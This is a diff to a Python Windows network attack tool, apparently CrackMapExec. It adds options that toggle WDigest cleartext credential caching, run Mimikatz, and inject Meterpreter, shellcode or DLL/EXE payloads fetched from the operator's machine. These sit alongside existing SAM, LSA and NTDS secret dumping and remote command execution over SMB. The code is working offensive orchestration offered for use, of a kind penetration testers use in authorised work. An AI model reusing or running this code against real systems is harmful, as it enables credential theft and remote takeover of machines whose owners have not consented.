@@ -12,6 +12,8 @@ from scripts.secretsdump import DumpSecrets
 from passpoldump import PassPolDump
 from rpcquery import RPCQUERY
 from smbspider import SMBSPIDER
+from uacdump import UACdump
+from wdigestenable import WdisgestEnable
 from smartlogin import smart_login
 from remotefilesystem import RemoteFileSystem
 from datetime import datetime
@@ -24,6 +26,7 @@ import socket
 def connect(host):
     '''
         My imagination flowed free when coming up with this name
+        This is where all the magic happens
     '''
 
     try:
@@ -60,7 +63,7 @@ def connect(host):
 
             smb = smart_login(host, smb, domain)
             #Get our IP from the socket
-            settings.args.local_ip = smb.getSMBServer().get_socket().getsockname()[0]
+            local_ip = smb.getSMBServer().get_socket().getsockname()[0]
 
             if settings.args.delete or settings.args.download or settings.args.list or settings.args.upload:
                 rfs = RemoteFileSystem(host, smb)
@@ -90,10 +93,10 @@ def connect(host):
             if settings.args.sam or settings.args.lsa or settings.args.ntds:
                 dumper = DumpSecrets(host,
                                      settings.args.port,
-                                     './logs/{}'.format(host),
+                                     'logs/{}'.format(host),
                                      smb,
                                      settings.args.kerb)
-                
+
                 dumper.do_remote_ops()
                 if settings.args.sam:
                     dumper.dump_SAM()
@@ -136,8 +139,9 @@ def connect(host):
                     rpc_query.enum_lusers(host)
 
             if settings.args.spider:
-                smb_spider = smbspider(host, smb)
+                smb_spider = SMBSPIDER(host, smb)
                 smb_spider.spider(settings.args.spider, settings.args.depth)
+                smb_spider.finish()
 
             if settings.args.wmi_query:
                 wmi_query = WMIQUERY(settings.args.user, 
@@ -149,12 +153,42 @@ def connect(host):
 
                 wmi_query.run(settings.args.wmi_query, host, settings.args.namespace)
 
+            if settings.args.check_uac:
+                uac = UACdump(smb, settings.args.kerb)
+                uac.run()
+
+            if settings.args.enable_wdigest:
+                wdigest = WdisgestEnable(smb, settings.args.kerb)
+                wdigest.enable()
+
+            if settings.args.disable_wdigest:
+                wdigest = WdisgestEnable(smb, settings.args.kerb)
+                wdigest.disable()
+
             if settings.args.command:
                 EXECUTOR(settings.args.command, host, domain, settings.args.no_output, smb)
 
             if settings.args.pscommand:
                 EXECUTOR(ps_command(settings.args.pscommand), host, domain, settings.args.no_output, smb)
 
+            if settings.args.mimikatz:
+                powah_command = PowerSploit(settings.args.server, local_ip)
+                EXECUTOR(powah_command.mimikatz(), host, domain, True, smb)
+
+            if settings.args.mimikatz_cmd:
+                powah_command = PowerSploit(settings.args.server, local_ip)
+                EXECUTOR(powah_command.mimikatz(settings.args.mimikatz_cmd), host, domain, True, smb)
+
+            if settings.args.inject:
+                powah_command = PowerSploit(settings.args.server, local_ip)
+                if settings.args.inject.startswith('met_'):
+                    EXECUTOR(powah_command.inject_meterpreter(), host, domain, True, smb)
+
+                if settings.args.inject == 'shellcode':
+                    EXECUTOR(powah_command.inject_shellcode(), host, domain, True, smb)
+
+                if settings.args.inject == 'dll' or settings.args.inject == 'exe':
+                    EXECUTOR(powah_command.inject_exe_dll(), host, domain, True, smb)
         try:
             smb.logoff()
         except:
